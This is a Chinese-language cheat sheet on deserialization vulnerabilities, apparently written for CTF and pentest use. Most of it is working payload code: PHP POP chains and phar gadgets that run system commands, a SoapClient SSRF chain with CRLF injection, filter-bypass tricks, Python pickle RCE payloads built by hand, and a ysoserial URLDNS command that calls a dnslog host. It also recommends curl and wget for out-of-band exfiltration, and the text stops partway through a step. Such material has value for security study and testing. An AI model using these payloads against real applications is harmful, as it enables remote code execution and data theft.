# 反序列化漏洞

## 1. 概述
反序列化漏洞是现代Web安全中最复杂和危险的漏洞类型之一。攻击者通过构造恶意序列化数据，在目标应用反序列化时触发魔术方法/回调函数，实现代码执行、文件操作、SSRF等攻击。

**各语言核心函数：**
- **PHP**: `unserialize()`, `phar://`协议
- **Java**: `ObjectInputStream.readObject()`, `readUnshared()`，XMLDecoder, Hessian
- **Python**: `pickle.loads()`, `cPickle.loads()`, `yaml.load()` (unsafe)
- **Node.js**: `node-serialize`, `serialize-javascript`, `funcster`

## 2. 核心原理

反序列化问题的根源是：序列化数据中包含了对象的类信息，反序列化时自动创建对象并触发魔术方法（如PHP的`__destruct()`、`__wakeup()`），这些方法中的逻辑可能被恶意利用。

**PHP魔术方法触发链（按执行顺序）：**
```
构造对象 __construct() → 反序列化完毕 __wakeup() → 
销毁对象 __destruct() → toString时 __toString() → 
访问不存在属性 __get()/__set() → 调用不存在方法 __call()
```

## 3. 关键技巧与Payload

### 3.1 PHP反序列化

**基础POP链构造：**
```php
<?php
class A {
    public $cmd;
    function __destruct() {
        system($this->cmd);
    }
}

$a = new A();
$a->cmd = 'cat /flag';
echo urlencode(serialize($a));
// O:1:"A":1:{s:3:"cmd";s:9:"cat /flag";}
?>
```

**常用魔法方法及其攻击面：**
| 魔法方法 | 触发时机 | 常用利用 |
|---------|---------|---------|
| `__destruct()` | 对象销毁时 | 执行命令、文件操作 |
| `__wakeup()` | 反序列化后立即执行 | 危险代码初始化 |
| `__toString()` | 对象被转换字符串时 | 配合`echo`/`preg_match` |
| `__call()` | 调用不存在方法时 | 动态调用其他类方法 |
| `__get()` | 访问不存在属性时 | 读取敏感值/触发其他链 |
| `__set()` | 设置不存在属性时 | 写入属性触发后续利用 |
| `__invoke()` | 把对象当函数调用时 | 执行回调 |
| `__sleep()` | 序列化时(注意: 这里方向相反) | 返回要序列化的属性 |

**常用内置类利用（没有source code时的替代）：**
- `SoapClient` — 构造SSRF
- `SimpleXMLElement` — XXE
- `SplFileObject` — 文件操作  
- `Error/Exception` — XSS/信息泄露
- `GlobIterator` — 目录遍历
- `SplObjectStorage` — 链式依赖

**SoapClient SSRF链：**
```php
<?php
$a = new SoapClient(null, array(
    'uri' => 'http://target.com/',
    'location' => 'http://internal:8080/flag',
    'user_agent' => "evil\r\nX-Forwarded-For: 127.0.0.1\r\n\r\n"
));
$b = serialize($a);
// 触发 __call() 时会发SOAP请求到location
// 配合 class_exists() 等方式触发
?>
```

**phar://反序列化：**
PHP中所有phar://文件访问都会自动反序列化metadata：
```php
<?php
class Evil {
    function __destruct() {
        system('cat /flag');
    }
}

$phar = new Phar('phar.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'test');
$phar->setStub('<?php __HALT_COMPILER(); ? >');
$phar->setMetadata(new Evil());
$phar->stopBuffering();
// 触发：include('phar://phar.phar/test.txt');
// 或 file_exists('phar://phar.phar/test.txt');
// 或 fopen('phar://phar.phar/test.txt', 'r');
?>
```
phar利用不依赖`unserialize()`函数，极大扩展了攻击面。

**绕过技巧：**

绕过`__wakeup()`（PHP < 5.6.25 / 7.0.10）：
```php
// O:4:"Evil":1:{...}  改为
// O:4:"Evil":2:{...}  属性数>实际数→跳过__wakeup()
```

绕过特征检测：
```
# 类名小写 (PHP不区分大小写类名但序列化区分)
O:4:"evil":1:...

# C格式（实现Serializable接口）
C:4:"Evil":20:{...}

# 十六进制属性名
S:3:"cmd":...

# 利用正负号绕过长度检查
O:+4:"Evil":1:{...}
```

### 3.3 Python反序列化

**pickle RCE：**
```python
import pickle, os, base64

class Evil:
    def __reduce__(self):
        return (os.system, ('cat /flag',))

payload = base64.b64encode(pickle.dumps(Evil())).decode()
print(payload)  # 将base64传给目标 pickle.loads()

# 手工构造 (更加硬核)
import pickle, pickletools
# 直接构造 opcode:
# b"cos\nsystem\n(S'cat /flag'\ntR."
payload = base64.b64encode(b"cos\nsystem\n(S'cat /flag'\ntR.")).decode()
```

**pickle opcode速查：**
| Opcode | 功能 |
|--------|------|
| `c` | 导入模块 (如 `cos\npopen\n`) |
| `(` | 压入标记 |
| `S'xxx'` | 压入字符串 |
| `t` | 弹出标记，组装tuple |
| `R` | 调用可执行对象 |
| `.` | 停止 |
| `o` | 弹出参数和对象，用参数调用对象 |

## 4. 常见误区与注意事项
1. **phar://反序列化最隐蔽**：`file_exists()`、`is_file()`、`filesize()`、`file_get_contents()`、`getimagesize()` 等所有文件函数都支持`phar://`stream wrapper，只要参数可控即可触发反序列化。
2. **PHP序列化private/protected属性**：private属性含`\0类名\0属性名`，protected含`\0*\0属性名`，手工构造时注意NULL字节。
3. **Java序列化magic bytes**：序列化数据以`ac ed 00 05`开头(Hessian以`H`或`C`开头)，可作为识别指纹。
4. **JNDI在JDK高版本中的限制**：JDK 11.0.1+默认禁用LDAP远程引用；`com.sun.jndi.ldap.object.trustURLCodebase`默认为false（绕过需本地有利用类）。
5. **无回显的Java反序列化**：使用`URLDNS`链验证是否存在漏洞；Payload命令执行用`curl`/`wget`外带；Tomcat回显(特殊链)或Spring回显。
6. **Fastjson与Jackson混淆**：两者`@type`行为不同；Fastjson 1.2.68+引入safeMode。
7. **pickle反序列化无回显**：用curl/dnslog外带；或写文件回显(Flask静态资源路径)。
8. **offline策略**：本地预编译ysoserial.jar及各常见链；准备phpggc的ThinkPHP/Laravel/WordPress链；记录各JDK版本默认限制。

```
场景：POST /api/data 的data参数含Base64编码的Java序列化数据
```
步骤：
1. 用ysoserial生成URLDNS链验证: `java -jar ysoserial.jar URLDNS http://xxx.dnslog.cn > payload.ser`
